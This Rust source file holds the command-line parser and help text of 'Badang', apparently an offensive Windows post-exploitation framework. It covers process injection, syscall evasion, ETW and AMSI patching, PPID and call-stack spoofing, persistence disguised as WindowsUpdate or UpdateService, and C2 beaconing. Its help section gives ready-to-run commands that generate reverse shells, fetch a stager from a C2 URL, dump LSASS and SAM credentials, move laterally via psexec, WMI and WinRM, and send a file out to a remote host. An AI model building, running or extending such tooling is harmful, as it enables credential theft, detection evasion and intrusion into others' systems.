// Badang — CLI argument parsing
use std::env;
use std::process;

// `CLI` is a well-established acronym (Command Line Interface).
#[allow(clippy::upper_case_acronyms)]
pub struct CLI {
    pub command: String,
    pub dry_run: bool,
    pub verbose: bool,
    pub confirm: bool,
    pub target_pid: u32,
    pub inject_technique: String,
    pub payload: String,
    pub syscall_func: String,
    pub unhook_func: String,
    pub convert_input: String,
    pub convert_output: String,
    pub convert_format: String,
    pub generate_type: String,
    pub generate_command: String,
    pub generate_title: String,
    pub generate_text: String,
    pub generate_lhost: String,
    pub generate_lport: u16,
    pub generate_url: String,
    pub generate_stager_key: String,
    pub generate_package: String,
    pub scan_filter: String,
    pub etw_target: String,
    pub amsi_target: String,
    pub encrypt_method: String,
    pub encrypt_key: String,
    pub ppid_parent: String,
    pub ppid_child: String,
    pub ppid_suspended: bool,
    pub indirect: bool,
    pub sleep_method: String,
    pub sleep_duration: u32,
    pub spoof_func: String,
    pub persist_method: String,
    pub persist_name: String,
    pub persist_target: String,
    pub comms_channel: String,
    pub comms_host: String,
    pub comms_port: u16,
    pub comms_interval: u32,
    pub comms_jitter: u8,
    pub comms_key: String,
    pub comms_path: String,
    pub comms_use_sleep_obfs: bool,
    pub comms_insecure: bool,
    pub loader_check: String,
    pub loader_action: String,
    pub postex_module: String,
    pub postex_remote: String,
    pub postex_output: String,
    pub postex_username: String,
    pub postex_password: String,
    pub postex_command: String,
    pub postex_service: String,
    pub postex_payload: String,
    pub postex_file: String,
    pub postex_listen_port: u16,
    pub postex_remote_host: String,
    pub postex_remote_port: u16,
    pub postex_exfil_key: String,
}

impl CLI {
    pub fn parse() -> Self {
        let args: Vec<String> = env::args().collect();

        let mut cli = CLI {
            command: String::from("help"),
            dry_run: true,
            verbose: false,
            confirm: false,
            target_pid: 0,
            inject_technique: String::from("createremote"),
            payload: String::from("payload.bin"),
            syscall_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
            unhook_func: crate::obf::s(crate::obf::NT_CREATE_THREAD),
            convert_input: String::new(),
            convert_output: String::from("payload.bin"),
            convert_format: String::from("auto"),
            generate_type: String::new(),
            generate_command: String::from("calc.exe"),
            generate_title: String::from("Badang"),
            generate_text: String::from("Hello from Badang"),
            generate_lhost: String::from("127.0.0.1"),
            generate_lport: 4444,
            generate_url: String::new(),
            generate_stager_key: String::new(),
            generate_package: String::new(),
            scan_filter: String::new(),
            etw_target: crate::obf::s(crate::obf::ETW_EVENT_WRITE),
            amsi_target: crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
            encrypt_method: String::from("xor"),
            encrypt_key: String::new(),
            ppid_parent: String::new(),
            ppid_child: String::from("notepad.exe"),
            ppid_suspended: false,
            indirect: false,
            sleep_method: String::from("manual"),
            sleep_duration: 3000,
            spoof_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
            persist_method: String::new(),
            persist_name: String::new(),
            persist_target: String::new(),
            comms_channel: String::from("https"),
            comms_host: String::new(),
            comms_port: 443,
            comms_interval: 60000,
            comms_jitter: 15,
            comms_key: String::new(),
            comms_path: String::from("/api/status"),
            comms_use_sleep_obfs: false,
            comms_insecure: false,
            loader_check: String::from("all"),
            loader_action: String::from("report"),
            postex_module: String::new(),
            postex_remote: String::new(),
            postex_output: String::new(),
            postex_username: String::new(),
            postex_password: String::new(),
            postex_command: String::new(),
            postex_service: String::new(),
            postex_payload: String::new(),
            postex_file: String::new(),
            postex_listen_port: 0,
            postex_remote_host: String::new(),
            postex_remote_port: 0,
            postex_exfil_key: String::new(),
        };

        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "--help" | "-h" => {
                    print_help();
                    process::exit(0);
                }
                "--verbose" | "-v" => cli.verbose = true,
                "--dry-run" | "-n" => cli.dry_run = true,
                "--execute" | "-x" => cli.dry_run = false,
                "--confirm" | "-c" => cli.confirm = true,
                "--pid" | "-p" => {
                    i += 1;
                    if i < args.len() {
                        cli.target_pid = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid PID: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--technique" | "-t" => {
                    i += 1;
                    if i < args.len() {
                        cli.inject_technique = args[i].clone();
                    }
                }
                "--syscall" | "-s" | "--func" => {
                    i += 1;
                    if i < args.len() {
                        cli.syscall_func = args[i].clone();
                    }
                }
                "--unhook" | "-u" => {
                    i += 1;
                    if i < args.len() {
                        cli.unhook_func = args[i].clone();
                    }
                }
                "--payload" | "-l" => {
                    i += 1;
                    if i < args.len() {
                        cli.payload = args[i].clone();
                    }
                }
                "--input" | "-i" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_input = args[i].clone();
                    }
                }
                "--output" | "-o" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_output = args[i].clone();
                    }
                }
                "--format" | "-f" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_format = args[i].clone();
                    }
                }
                "analyze" => cli.command = String::from("analyze"),
                "syscall" => cli.command = String::from("syscall"),
                "inject" => cli.command = String::from("inject"),
                "load" => cli.command = String::from("load"),
                "convert" => cli.command = String::from("convert"),
                "generate" => cli.command = String::from("generate"),
                "scan" => cli.command = String::from("scan"),
                "unhook" => cli.command = String::from("unhook"),
                "etw" => cli.command = String::from("etw"),
                "amsi" => cli.command = String::from("amsi"),
                "encrypt" => cli.command = String::from("encrypt"),
                "ppid" => cli.command = String::from("ppid"),
                "sleep" => cli.command = String::from("sleep"),
                "spoof" => cli.command = String::from("spoof"),
                "persist" => cli.command = String::from("persist"),
                "comms" => cli.command = String::from("comms"),
                "loader" => cli.command = String::from("loader"),
                "postex" => cli.command = String::from("postex"),
                "--parent" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_parent = args[i].clone();
                    }
                }
                "--parent-pid" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_parent = args[i].clone();
                    }
                }
                "--child" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_child = args[i].clone();
                    }
                }
                "--suspended" => cli.ppid_suspended = true,
                "--indirect" => cli.indirect = true,
                "--duration" => {
                    i += 1;
                    if i < args.len() {
                        cli.sleep_duration = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid duration: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--demo" => {
                    i += 1;
                    if i < args.len() {
                        cli.spoof_func = args[i].clone();
                    }
                }
                "--method" => {
                    i += 1;
                    if i < args.len() {
                        cli.encrypt_method = args[i].clone();
                        cli.sleep_method = args[i].clone();
                        cli.persist_method = args[i].clone();
                    }
                }
                "--key" => {
                    i += 1;
                    if i < args.len() {
                        cli.encrypt_key = args[i].clone();
                    }
                }
                "--patch" => {
                    i += 1;
                    if i < args.len() {
                        let val = args[i].clone();
                        if cli.command == "amsi" {
                            cli.amsi_target = val;
                        } else {
                            cli.etw_target = val;
                        }
                    }
                }
                "--filter" => {
                    i += 1;
                    if i < args.len() {
                        cli.scan_filter = args[i].clone();
                    }
                }
                "--type" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_type = args[i].clone();
                    }
                }
                "--command" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_command = args[i].clone();
                    }
                }
                "--title" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_title = args[i].clone();
                    }
                }
                "--text" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_text = args[i].clone();
                    }
                }
                "--lhost" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_lhost = args[i].clone();
                    }
                }
                "--lport" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_lport = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid port: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--url" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_url = args[i].clone();
                    }
                }
                "--stager-key" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_stager_key = args[i].clone();
                    }
                }
                "--package" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_package = args[i].clone();
                    }
                }
                "--name" => {
                    i += 1;
                    if i < args.len() {
                        cli.persist_name = args[i].clone();
                    }
                }
                "--target" => {
                    i += 1;
                    if i < args.len() {
                        cli.persist_target = args[i].clone();
                    }
                }
                "--channel" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_channel = args[i].clone();
                    }
                }
                "--host" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_host = args[i].clone();
                    }
                }
                "--comms-port" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_port = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid port: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--interval" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_interval = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid interval: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--jitter" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_jitter = args[i].parse::<u8>().unwrap_or_else(|_| {
                            eprintln!("Invalid jitter: {}", args[i]);
                            process::exit(1);
                        }).min(50);
                    }
                }
                "--comms-key" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_key = args[i].clone();
                    }
                }
                "--path" => {
                    i += 1;
                    if i < args.len() {
                        cli.comms_path = args[i].clone();
                    }
                }
                "--sleep-obfs" => {
                    cli.comms_use_sleep_obfs = true;
                }
                "--comms-insecure" => {
                    cli.comms_insecure = true;
                }
                "--check" => {
                    i += 1;
                    if i < args.len() {
                        cli.loader_check = args[i].clone();
                    }
                }
                "--action" => {
                    i += 1;
                    if i < args.len() {
                        cli.loader_action = args[i].clone();
                    }
                }
                "--module" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_module = args[i].clone();
                    }
                }
                "--remote" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_remote = args[i].clone();
                    }
                }
                "--postex-output" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_output = args[i].clone();
                    }
                }
                "--postex-user" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_username = args[i].clone();
                    }
                }
                "--postex-pass" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_password = args[i].clone();
                    }
                }
                "--postex-cmd" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_command = args[i].clone();
                    }
                }
                "--postex-service" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_service = args[i].clone();
                    }
                }
                "--postex-payload" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_payload = args[i].clone();
                    }
                }
                "--file" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_file = args[i].clone();
                    }
                }
                "--listen-port" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_listen_port = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid port: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--remote-host" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_remote_host = args[i].clone();
                    }
                }
                "--remote-port" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_remote_port = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid port: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--exfil-key" => {
                    i += 1;
                    if i < args.len() {
                        cli.postex_exfil_key = args[i].clone();
                    }
                }
                _ => {
                    eprintln!("Unknown argument: {}", args[i]);
                    print_help();
                    process::exit(1);
                }
            }
            i += 1;
        }

        // PID is required for process-targeting commands
        if (cli.command == "analyze" || cli.command == "inject") && cli.target_pid == 0 {
            eprintln!(
                "ERROR: --pid <PID> is required for {} command.",
                cli.command
            );
            eprintln!("Use --dry-run (default) to simulate without executing.");
            process::exit(1);
        }

        // Type is required for generate command
        if cli.command == "generate" && cli.generate_type.is_empty() {
            eprintln!("ERROR: --type is required for generate command.");
            eprintln!("Types: nop, exec, messagebox, reverse_tcp, bind_tcp, stager");
            process::exit(1);
        }

        // Method is required for persist command
        if cli.command == "persist" && cli.persist_method.is_empty() {
            eprintln!("ERROR: --method is required for persist command.");
            eprintln!("Methods: registry, schtask, wmi, hijack, com, service");
            process::exit(1);
        }

        // Host is required for comms command (live mode)
        if cli.command == "comms" && !cli.dry_run && cli.comms_host.is_empty() {
            eprintln!("ERROR: --host is required for comms command.");
            process::exit(1);
        }
        if cli.command == "comms" && !cli.dry_run && cli.comms_key.is_empty() {
            eprintln!("ERROR: --comms-key is required for comms command.");
            process::exit(1);
        }

        // Module is required for postex command
        if cli.command == "postex" && !cli.dry_run && cli.postex_module.is_empty() {
            eprintln!("ERROR: --module is required for postex command.");
            eprintln!("Modules: lsass, sam, token, psexec, wmi, winrm, exfil, socks, portfwd");
            process::exit(1);
        }
        if cli.command == "postex" && !cli.postex_module.is_empty() {
            if let Err(e) = crate::postex::PostExModule::from_str(&cli.postex_module) {
                eprintln!("ERROR: {}", e);
                process::exit(1);
            }
        }

        // Check category is required for loader command
        if cli.command == "loader"
            && crate::loader::CheckCategory::from_str(&cli.loader_check).is_none()
        {
            eprintln!("ERROR: unknown check category '{}'. Use: sandbox, debug, vm, all", cli.loader_check);
            process::exit(1);
        }

        // Payload file is required for the load command
        if cli.command == "load" && cli.payload.is_empty() {
            eprintln!("ERROR: --payload <PATH> is required for the load command.");
            process::exit(1);
        }

        cli
    }
}

fn print_help() {
    println!("Badang v0.2.0");
    println!();
    println!("USAGE: badang <command> [options]");
    println!();
    println!("COMMANDS:");
    println!("  analyze    Analyze target process APIs");
    println!("  syscall    Direct/indirect syscall invocation");
    println!("  inject     Process technique module");
    println!("  load       Load and verify a payload file (no execution)");
    println!("  convert    Convert payload between formats (hex/C/Python/Rust/decimal)");
    println!("  generate   Generate payload (built-in)");
    println!("  scan       List running processes (pick a target PID)");
    println!("  unhook     Restore original function bytes");
    println!("  etw        Telemetry management module");
    println!("  amsi       Memory scan management module");
    println!("  encrypt    Encrypt payload with XOR/RC4 (adds decryption stub)");
    println!("  ppid       Parent attribute management");
    println!("  sleep      Memory protection during sleep");
    println!("  spoof      Call stack management");
    println!("  persist    Persistence configuration module");
    println!("  comms      Remote communication channel");
    println!("  loader     Pre-execution environment checks");
    println!("  postex     Post-exploitation modules");
    println!();
    println!("OPTIONS:");
    println!("  -p, --pid <PID>       Target process ID (required)");
    println!("  -s, --syscall <FUNC>  Target syscall function");
    println!("  -f, --func <FUNC>     Target function name (alias for --syscall)");
    println!("  -t, --technique <TEC> Technique selection");
    println!("  -l, --payload <PATH>  Payload file path");
    println!("  -u, --unhook <FUNC>   Target API to restore");
    println!("  -i, --input <TEXT>    Bytes to convert");
    println!("  -o, --output <PATH>   Output .bin file (default: payload.bin)");
    println!(
        "      --format <FMT>    Input format: auto/hex/c/python/rust/decimal (default: auto)"
    );
    println!("  -n, --dry-run         Simulate without executing (default)");
    println!("  -x, --execute         Actually perform the operation");
    println!("  -c, --confirm         Confirm before executing");
    println!("      --filter <NAME>   Filter processes by name (scan command)");
    println!("      --patch <FUNC>    Target function to patch (etw/amsi commands)");
    println!("  -v, --verbose         Verbose output");
    println!();
    println!("GENERATE OPTIONS:");
    println!("  --type <TYPE>         Payload type: nop, exec, messagebox, reverse_tcp, bind_tcp, stager");
    println!("  --command <CMD>       Command to execute (exec type, default: calc.exe)");
    println!("  --title <TEXT>        MessageBox title (messagebox type)");
    println!("  --text <TEXT>         MessageBox body text (messagebox type)");
    println!("  --lhost <IP>          Listener IP address (reverse_tcp type)");
    println!("  --lport <PORT>        Listener port (reverse_tcp/bind_tcp, default: 4444)");
    println!("  --url <URL>           Download URL (stager type)");
    println!("  --stager-key <KEY>    XOR key for payload decryption (stager type)");
    println!("  --package <FMT>       Package output: exe, ps1, csharp, dll (source code)");
    println!();
    println!("GENERATE EXAMPLES:");
    println!("  badang-cli generate --type exec --command \"calc.exe\" -o payload.bin");
    println!(
        "  badang-cli generate --type messagebox --title \"Test\" --text \"Hello\" -o msg.bin"
    );
    println!(
        "  badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin"
    );
    println!("  badang-cli generate --type bind_tcp --lport 4444 -o bind.bin");
    println!("  badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key s3cret -o stager.bin");
    println!("  badang-cli generate --type exec --command calc.exe --package exe -o runner.rs");
    println!("  badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1");
    println!();
    println!("CONVERT EXAMPLES:");
    println!("  badang-cli convert -i \"fc 48 83 e4 f0\" -o payload.bin");
    println!("  badang-cli convert -i \"\\xfc\\x48\\x83\" -o payload.bin");
    println!("  badang-cli convert -i \"{{0xfc, 0x48}}\" --format c -o payload.bin");
    println!("  badang-cli convert --payload input.bin --format hex    (dump a .bin as hex)");
    println!();
    println!("ETW EXAMPLES:");
    println!("  badang-cli etw -x -c");
    println!("  badang-cli etw --patch {} -x -c", crate::obf::s(crate::obf::ETW_EVENT_WRITE_FULL));
    println!("  badang-cli etw --patch {} -x -c", crate::obf::s(crate::obf::NT_TRACE_EVENT));
    println!();
    println!("AMSI EXAMPLES:");
    println!("  badang-cli amsi -x -c");
    println!("  badang-cli amsi --patch {} -x -c", crate::obf::s(crate::obf::AMSI_SCAN_STRING));
    println!();
    println!("ENCRYPT OPTIONS:");
    println!("  --method <METHOD>     Encryption method: xor, xormulti, rc4 (default: xor)");
    println!("  --key <KEY>           Encryption key (required)");
    println!();
    println!("ENCRYPT EXAMPLES:");
    println!(
        "  badang-cli encrypt --payload rev.bin --method xor --key A -o encrypted.bin"
    );
    println!(
        "  badang-cli encrypt --payload rev.bin --method rc4 --key \"secretkey\" -o encrypted.bin"
    );
    println!();
    println!("SYSCALL OPTIONS:");
    println!("  --indirect            Use indirect syscall resolution");
    println!();
    println!("SYSCALL EXAMPLES:");
    println!("  badang-cli syscall --syscall {} -x -c", crate::obf::s(crate::obf::NT_ALLOC_VM));
    println!("  badang-cli syscall --syscall {} --indirect -x -c", crate::obf::s(crate::obf::NT_CREATE_THREAD));
    println!();
    println!("PPID OPTIONS:");
    println!("  --parent <NAME>       Parent process name (e.g., explorer.exe)");
    println!("  --parent-pid <PID>    Parent process PID (alternative to --parent)");
    println!("  --child <CMD>         Child command to spawn (default: notepad.exe)");
    println!("  --suspended           Create child suspended");
    println!();
    println!("PPID EXAMPLES:");
    println!("  badang-cli ppid --parent explorer.exe --child notepad.exe -x -c");
    println!("  badang-cli ppid --parent-pid 1234 --child cmd.exe --suspended -x -c");
    println!();
    println!("SLEEP OPTIONS:");
    println!("  --method <METHOD>     Method: manual, ekko (default: manual)");
    println!("  --duration <MS>       Duration in ms (default: 3000)");
    println!();
    println!("SLEEP EXAMPLES:");
    println!("  badang-cli sleep --method manual --duration 5000 -x -c");
    println!("  badang-cli sleep --method ekko --duration 3000 -x -c");
    println!();
    println!("SPOOF OPTIONS:");
    println!("  --demo <FUNC>         Target function for demo");
    println!();
    println!("SPOOF EXAMPLES:");
    println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_ALLOC_VM));
    println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_CREATE_THREAD));
    println!();
    println!("PERSIST OPTIONS:");
    println!("  --method <METHOD>     Technique: registry, schtask, wmi, hijack, com, service");
    println!("  --name <NAME>         Value name, task name, or service name");
    println!("  --target <PATH>       Target directory (hijack) or CLSID (com)");
    println!("  -l, --payload <PATH>  Payload executable path");
    println!();
    println!("PERSIST EXAMPLES:");
    println!("  badang-cli persist --method registry --name UpdateService --payload runner.exe -x -c");
    println!("  badang-cli persist --method service --name WindowsUpdate --payload svc.exe -x -c");
    println!("  badang-cli persist --method schtask --name SystemCheck --payload runner.exe -x -c");
    println!("  badang-cli persist --method hijack --name version.dll --target C:\\\\App --payload ver.dll -x -c");
    println!("  badang-cli persist --method com --target \"{{CLSID}}\" --payload server.dll -x -c");
    println!();
    println!("COMMS OPTIONS:");
    println!("  --channel <CHAN>      Channel: https, dns, smb (default: https)");
    println!("  --host <HOST>        Remote endpoint address (required)");
    println!("  --comms-port <PORT>  Remote endpoint port (default: 443)");
    println!("  --interval <MS>      Check-in interval in ms (default: 60000)");
    println!("  --jitter <PCT>       Jitter percentage 0-50 (default: 15)");
    println!("  --comms-key <HEX>    RC4 pre-shared key in hex (required)");
    println!("  --path <PATH>        Check-in URI path (default: /api/status)");
    println!("  --sleep-obfs         Enable memory encryption during sleep");
    println!("  --check <CAT>        Loader check category: sandbox/debug/vm/all");
    println!("  --action <ACT>       Loader fail action: report/exit");
    println!();
    println!("COMMS EXAMPLES:");
    println!("  badang-cli comms --host 10.0.0.1 --comms-port 443 --comms-key aabbccdd -x -c");
    println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --interval 30000 --jitter 20 -x -c");
    println!("  badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --sleep-obfs -x -c");
    println!();
    println!("LOADER OPTIONS:");
    println!("  --check <CATEGORY>   Check category: sandbox, debug, vm, all (default: all)");
    println!("  --action <ACTION>    On detection: report, exit (default: report)");
    println!();
    println!("POST-EXPLOITATION OPTIONS:");
    println!("  --module <MODULE>    Module: lsass, sam, token, psexec, wmi, winrm, exfil, socks, portfwd");
    println!("  --remote <HOST>      Remote target host (lateral movement)");
    println!("  --postex-output <P>  Output path (memory snapshot / registry export)");
    println!("  --postex-user <USER> Remote credentials username");
    println!("  --postex-pass <PASS> Remote credentials password");
    println!("  --postex-cmd <CMD>   Remote command to execute (wmi/winrm)");
    println!("  --postex-service <N> Service name (psexec, default: BadangSvc)");
    println!("  --postex-payload <P> Payload path to copy (psexec)");
    println!();
    println!("POST-EXPLOITATION EXAMPLES:");
    println!("  badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c");
    println!("  badang-cli postex --module sam --postex-output C:\\\\Temp -x -c");
    println!("  badang-cli postex --module token --pid 672 -x -c");
    println!("  badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c");
    println!("  badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd \"cmd /c whoami\" -x -c");
    println!("  badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd \"hostname\" -x -c");
    println!("  badang-cli postex --module exfil --file secret.db --remote-host 10.0.0.1 --remote-port 8443 -x -c");
    println!("  badang-cli postex --module socks --listen-port 1080 -x -c");
    println!("  badang-cli postex --module portfwd --listen-port 3389 --remote-host 10.0.0.5 --remote-port 3389 -x -c");
    println!();
    println!("LOADER EXAMPLES:");
    println!("  badang-cli loader --check all -x -c");
    println!("  badang-cli loader --check sandbox -x -c");
    println!("  badang-cli loader --check debug --action exit -x -c");
    println!("  badang-cli loader --check vm -x -c");
    println!();
    println!("WARNING: For authorized use only.");
}
